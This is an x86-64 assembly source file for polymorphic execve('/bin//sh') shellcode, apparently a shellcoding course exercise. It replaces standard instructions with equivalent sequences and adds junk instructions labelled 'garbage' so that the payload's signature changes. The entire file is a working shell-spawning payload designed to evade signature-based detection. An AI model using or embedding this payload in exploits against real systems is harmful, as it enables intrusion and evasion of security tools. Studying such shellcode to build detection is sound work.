global _start 

section .text

_start:

	; First NULL push

	; xor rax, rax

	mov rbx, rax    ;poly equiv of xor rax, rax (1 of 2)
	sub rax, rbx    ;poly equiv of xor rax, rax (2 of 2)
        add rcx, 10     ;garbage; rcx is unused this script (1 of 2) 


	; push rax

	mov qword [rsp -8], rax  ;poly equiv of push rax (1 of 2)
	xor rcx, rcx    ;garbage; rcx is unused this script (2 of 2)
	sub rsp, 8      ;poly equiv of push rax (2 of 2)

	
	; push /bin//sh in reverse 

	mov rbx, 0x68732f2f6e69622f
	push rbx

	; store /bin//sh address in RDI

	mov rdi, rsp

	; Second NULL push 
	push rax

	; set RDX
	mov rdx, rsp 


	; Push address of /bin//sh
	push rdi

	; set RSI

	mov rsi, rsp

	; Call the Execve syscall 
	add rax, 59
	syscall
